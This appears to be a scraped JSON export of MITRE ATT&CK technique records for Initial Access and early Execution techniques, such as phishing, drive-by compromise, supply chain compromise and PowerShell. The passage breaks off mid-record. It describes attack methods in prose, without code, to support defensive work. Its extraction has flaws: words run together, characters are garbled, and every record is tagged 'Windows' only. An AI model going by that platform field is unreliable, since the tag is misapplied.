[
  {
    "technique_id": "T1659",
    "name": "Content Injection",
    "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e.,Drive-by Targetfollowed byDrive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e.,Ingress Tool Transfer) and other data to already compromised systems.[1]Adversaries may inject content to victim systems in various ways, including:From the middle, where the adversary is in-between legitimate online client-server communications (Note:this is similar but distinct fromAdversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment)[2]From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server[3]Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"[3][1][4]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:53:45.935911",
    "subtechniques": []
  },
  {
    "technique_id": "T1189",
    "name": "Drive-by Compromise",
    "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e.,Drive-by Target), including:A legitimate website is compromised, allowing adversaries to inject malicious codeScript files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversaryMalicious ads are paid for and served through legitimate ad providers (i.e.,Malvertising)Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)Browser push notifications may also be abused by adversaries and leveraged for malicious code injection viaUser Execution. By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.[1][2][3]Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[4]Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.UnlikeExploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:53:49.208644",
    "subtechniques": []
  },
  {
    "technique_id": "T1190",
    "name": "Exploit Public-Facing Application",
    "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.[1][2][3][4][5]On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.[6][7]Depending on the flaw being exploited, this may also involveExploitation for Defense EvasionorExploitation for Client Execution.If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via theCloud Instance Metadata API), exploit container host access viaEscape to Host, or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.[8][9]For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.[10][11]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:53:52.571764",
    "subtechniques": []
  },
  {
    "technique_id": "T1133",
    "name": "External Remote Services",
    "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such asWindows Remote ManagementandVNCcan also be used externally.[1]Access toValid Accountsto use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.[2]Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesnâ€™t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.[3][4]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:53:55.832259",
    "subtechniques": []
  },
  {
    "technique_id": "T1200",
    "name": "Hardware Additions",
    "description": "Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e.Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e.Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.[1][2][3][4]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:53:59.160749",
    "subtechniques": []
  },
  {
    "technique_id": "T1566",
    "name": "Phishing",
    "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g.,Email Hiding Rules).[1][2]Another way to accomplish this is byEmail Spoofing[3]the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,[4]or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").[5]Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[6][7]or install adversary-accessible remote management tools onto their computer (i.e.,User Execution).[8]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:02.430130",
    "subtechniques": [
      {
        "id": "T1566.001",
        "name": "Spearphishing Attachment"
      },
      {
        "id": "T1566.002",
        "name": "Spearphishing Link"
      },
      {
        "id": "T1566.003",
        "name": "Spearphishing via Service"
      },
      {
        "id": "T1566.004",
        "name": "Spearphishing Voice"
      }
    ]
  },
  {
    "technique_id": "T1566.001",
    "name": "Spearphishing Attachment",
    "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely uponUser Executionto gain execution.[1]Spearphishing may also involve social engineering techniques, such as posing as a trusted source.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Phishing",
    "parent_technique_id": "T1566",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:05.905834"
  },
  {
    "technique_id": "T1566.002",
    "name": "Spearphishing Link",
    "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveragingUser Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").[1]URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example,hxxp://google.com@1157586937.[2]Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries toSteal Application Access Tokens.[3]These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.[4]Adversaries may also utilize spearphishing links toSteal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \"consent phishing\" into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .[3][4]Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \"device code phishing,\" an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.[5][6][7]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Phishing",
    "parent_technique_id": "T1566",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:09.323673"
  },
  {
    "technique_id": "T1566.003",
    "name": "Spearphishing via Service",
    "description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.[1]These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Phishing",
    "parent_technique_id": "T1566",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:12.667000"
  },
  {
    "technique_id": "T1566.004",
    "name": "Spearphishing Voice",
    "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex:Impersonation) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying onUser Executionfor delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[1][2]or install adversary-accessible remote management tools (Remote Access Tools) onto their computer.[3]Adversaries may also combine voice phishing withMulti-Factor Authentication Request Generationin order to trick users into divulging MFA credentials or accepting authentication prompts.[4]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Phishing",
    "parent_technique_id": "T1566",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:16.005167"
  },
  {
    "technique_id": "T1091",
    "name": "Replication Through Removable Media",
    "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.[1]This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[2][3]For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:19.378433",
    "subtechniques": []
  },
  {
    "technique_id": "T1195",
    "name": "Supply Chain Compromise",
    "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development toolsManipulation of a development environmentManipulation of source code repositories (public or private)Manipulation of source code in open-source dependenciesManipulation of software update/distribution mechanismsCompromised/infected system images (multiple cases of removable media infected at the factory)[1][2]Replacement of legitimate software with modified versionsSales of modified/counterfeit products to legitimate distributorsShipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.[3][4][5]Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[6][3][5]Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.[7]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:22.725641",
    "subtechniques": [
      {
        "id": "T1195.001",
        "name": "Compromise Software Dependencies and Development Tools"
      },
      {
        "id": "T1195.002",
        "name": "Compromise Software Supply Chain"
      },
      {
        "id": "T1195.003",
        "name": "Compromise Hardware Supply Chain"
      }
    ]
  },
  {
    "technique_id": "T1195.001",
    "name": "Compromise Software Dependencies and Development Tools",
    "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.[1]Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Supply Chain Compromise",
    "parent_technique_id": "T1195",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:26.065304"
  },
  {
    "technique_id": "T1195.002",
    "name": "Compromise Software Supply Chain",
    "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[1][2]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Supply Chain Compromise",
    "parent_technique_id": "T1195",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:29.385934"
  },
  {
    "technique_id": "T1195.003",
    "name": "Compromise Hardware Supply Chain",
    "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Supply Chain Compromise",
    "parent_technique_id": "T1195",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:32.721217"
  },
  {
    "technique_id": "T1199",
    "name": "Trusted Relationship",
    "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such,Valid Accountsused by the other party for access to internal network systems may be compromised and used.[1]In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.[2]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:36.065856",
    "subtechniques": []
  },
  {
    "technique_id": "T1078",
    "name": "Valid Accounts",
    "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1]Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:39.352417",
    "subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      }
    ]
  },
  {
    "technique_id": "T1078.001",
    "name": "Default Accounts",
    "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.[1][2][3]Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolenPrivate Keysor credential materials to legitimately connect to remote environments viaRemote Services.[4]Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account calledvpxuseris created on the ESXi server. If a threat actor is able to compromise this accountâ€™s credentials (for example, viaExploitation for Credential Accesson the vCenter host), they will then have access to the ESXi server.[5][6]",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:42.600432"
  },
  {
    "technique_id": "T1078.002",
    "name": "Domain Accounts",
    "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.[1]Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]Adversaries may compromise domain accounts, some with a high level of privileges, through various means such asOS Credential Dumpingor password reuse, allowing access to privileged resources of the domain.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:45.987715"
  },
  {
    "technique_id": "T1078.003",
    "name": "Local Accounts",
    "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials throughOS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:49.327085"
  },
  {
    "technique_id": "T1669",
    "name": "Wi-Fi Networks",
    "description": "Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks â€” requiringValid Accountsâ€” belonging to a target organization.[1][2]Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection.Adversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a targetâ€™s Wi-Fi network.[2]Once an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may performNetwork SniffingorAdversary-in-the-Middleactivities forCredential AccessorDiscovery.",
    "tactic": "Initial Access",
    "tactics": [
      "Initial Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:52.649827",
    "subtechniques": []
  },
  {
    "technique_id": "T1059",
    "name": "Command and Scripting Interpreter",
    "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor ofUnix Shellwhile Windows installations include theWindows Command ShellandPowerShell.There are also cross-platform interpreters such asPython, as well as those commonly associated with client applications such asJavaScriptandVisual Basic.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded inInitial Accesspayloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize variousRemote Servicesin order to achieve remote Execution.[1][2][3]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:56.022837",
    "subtechniques": [
      {
        "id": "T1059.001",
        "name": "PowerShell"
      },
      {
        "id": "T1059.003",
        "name": "Windows Command Shell"
      },
      {
        "id": "T1059.005",
        "name": "Visual Basic"
      },
      {
        "id": "T1059.006",
        "name": "Python"
      },
      {
        "id": "T1059.007",
        "name": "JavaScript"
      },
      {
        "id": "T1059.010",
        "name": "AutoHotKey & AutoIT"
      },
      {
        "id": "T1059.011",
        "name": "Lua"
      }
    ]
  },
  {
    "technique_id": "T1059.001",
    "name": "PowerShell",
    "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.[1]Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include theStart-Processcmdlet which can be used to run an executable and theInvoke-Commandcmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, includingEmpire,PowerSploit,PoshC2, and PSAttack.[2]PowerShell commands/scripts can also be executed without directly invoking thepowershell.exebinary through interfaces to PowerShell's underlyingSystem.Management.Automationassembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).[3][4][5]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:54:59.427252"
  },
  {
    "technique_id": "T1059.003",
    "name": "Windows Command Shell",
    "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely viaRemote Servicessuch asSSH.[1]Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leveragecmdto execute various commands and payloads. Common uses includecmdto execute a single command, or abusingcmdinteractively with input and output forwarded over a command and control channel.",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:55:03.019287"
  },
  {
    "technique_id": "T1059.005",
    "name": "Visual Basic",
    "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such asComponent Object Modeland theNative APIthrough the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.[1][2]Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.[3][4]VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place ofJavaScripton HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).[5]Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content intoSpearphishing Attachmentpayloads (which may also involveMark-of-the-Web Bypassto enable execution).[6]",
    "tactic": "Execution",
    "tactics": [
      "Execution"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Command and Scripting Interpreter",
    "parent_technique_id": "T1059",
    "mitre_version": "1.0",
